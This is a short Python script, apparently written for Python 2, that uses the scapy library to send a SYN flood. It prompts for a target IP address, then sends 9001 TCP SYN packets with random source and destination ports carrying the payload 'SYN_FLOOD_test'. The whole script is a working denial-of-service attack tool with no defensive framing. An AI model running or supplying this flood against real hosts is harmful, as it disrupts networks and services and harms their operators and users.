import sys, os
from scapy.all import *

targetIP = raw_input("Target IP Address: ")
#targetPort = raw_input("Target Port: ")

send (IP(dst=targetIP)/TCP(sport=RandShort(),dport=RandShort(), flags="S")/"SYN_FLOOD_test", count = 9001)
